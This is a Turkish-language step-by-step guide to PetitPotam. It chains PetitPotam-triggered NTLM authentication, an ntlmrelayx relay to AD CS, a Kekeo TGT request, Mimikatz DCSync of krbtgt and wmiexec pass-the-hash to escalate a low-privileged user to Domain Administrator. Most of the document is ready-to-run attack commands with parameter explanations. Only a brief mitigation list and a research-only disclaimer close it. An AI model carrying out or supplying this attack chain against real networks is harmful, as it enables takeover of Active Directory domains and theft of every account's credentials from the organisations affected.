# PetitPotam Kullanım Kılavuzu

## Giriş
PetitPotam, Microsoft'un MS-EFSRPC (Encrypting File System Remote Protocol) zafiyetini kullanarak bir Domain Controller (DC) üzerinde NTLM kimlik doğrulama tetiklemek için kullanılan bir araçtır. Bu araç, NTLM relay saldırılarında kritik bir bileşen olarak kullanılır ve düşük yetkili bir kullanıcıyı Domain Administrator seviyesine yükseltmek için zincirleme saldırılar gerçekleştirilmesine olanak tanır.

Bu kılavuz, PetitPotam'ın NTLM relay saldırılarıyla nasıl kullanılacağını adım adım açıklamaktadır.

---

## Gereksinimler
- **Hedef:** Bir Active Directory ortamı ve Active Directory Certificate Services (AD CS) yüklü bir Domain Controller
- **Saldırgan:** PetitPotam ve ntlmrelayx gibi araçlar için bir Linux veya Windows makinesi
- Python 3 ve gerekli kütüphaneler

---

## Özellikler
- NTLM kimlik doğrulamasını tetikleme
- AD CS üzerinden sertifika almak için kimlik bilgilerini relay etme
- Düşük yetkili bir kullanıcıyı Domain Administrator seviyesine yükseltme

---

## Kullanım

### 1. **ntlmrelayx Kurulumu ve Çalıştırılması**
PetitPotam saldırısı gerçekleştirilmeden önce `ntlmrelayx` kurulmalı ve hedef AD CS sunucusuna relay yapacak şekilde çalıştırılmalıdır.

#### Kurulum
```bash
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
sudo pip3 uninstall impacket
sudo pip3 install -r requirements.txt
sudo python3 setup.py install
```

#### Çalıştırma
```bash
sudo python3 ntlmrelayx.py -debug -smb2support --target http://pki.lab.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
```
- **`--target`**: AD CS sunucusunun URL'si (örnek: `pki.lab.local`)
- **`--template`**: AD CS tarafından kullanılan sertifika şablonu (örnek: `KerberosAuthentication`)

### 2. **PetitPotam ile NTLM Kimlik Doğrulaması Tetikleme**
PetitPotam kullanarak Domain Controller üzerinde NTLM kimlik doğrulamasını tetikleyin.

#### Kurulum
```bash
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam/
sudo pip3 install -r requirements.txt
```

#### Çalıştırma
```bash
python3 Petitpotam.py <listener IP> <target DC IP>
```
- **`<listener IP>`**: ntlmrelayx çalıştırılan saldırgan IP adresi
- **`<target DC IP>`**: hedef Domain Controller IP adresi

### 3. **Sertifika Alımı ve TGT Elde Edilmesi**
PetitPotam saldırısıyla elde edilen sertifikayı kullanarak bir Ticket Granting Ticket (TGT) elde edin.

#### Kekeo ile TGT Elde Etme
```bash
curl -LO https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20210723/kekeo.zip
unzip kekeo.zip
cd kekeo/
.x64kekeo.exe
base64 /input:on
tgt::ask /pfx:<base64_cert> /user:<dc-101$> /domain:<domain.local> /ptt
```
- **`<base64_cert>`**: AD CS üzerinden alınan Base64 PKCS12 sertifikası
- **`<dc-101$>`**: hedef DC makinesi adı
- **`<domain.local>`**: hedef domain adı

### 4. **LSA Sırlarının Çıkartılması**
Mimikatz kullanarak LSA sırlarını çıkartın.

```bash
curl -LO https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cd mimikatz/
.x64mimikatz.exe
lsadump::dcsync /domain:<domain.local> /user:<krbtgt>
```

### 5. **Pass-The-Hash ile Yetki Yükseltme**
NT hash kullanarak Domain Administrator olarak komut çalıştırın.

```bash
wmiexec.py -hashes :<NTLM_HASH> <domain>/<user>@<dc-ip>
```
- **`<NTLM_HASH>`**: Çıkarılan NT hash
- **`<domain>`**: Hedef domain adı
- **`<user>`**: Hedef kullanıcı adı
- **`<dc-ip>`**: Domain Controller IP adresi

---

## Güvenlik Önlemleri
1. **AD CS Servislerini Kaldırma:** Gereksiz AD CS servislerini devre dışı bırakın.
2. **NTLM Kimlik Doğrulamasını Sınırlandırma:** NTLM trafiğini sınırlayın veya devre dışı bırakın.
3. **IIS Ayarları:** NTLM sağlayıcısını Internet Information Services (IIS) üzerinden kaldırın.

---

## Kaynaklar
- [PetitPotam GitHub](https://github.com/topotam/PetitPotam)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Kekeo GitHub](https://github.com/gentilkiwi/kekeo)

---

Bu rehber, MS-EFSRPC ve AD CS açıklarından faydalanarak Domain Administrator seviyesine yükseltme için PetitPotam aracını kullanmayı açıklar. Araç yalnızca güvenlik araştırmaları ve eğitim amaçlı kullanılmalıdır. Kötüye kullanım durumlarında sorumluluk tamamen kullanıcıya aittir.
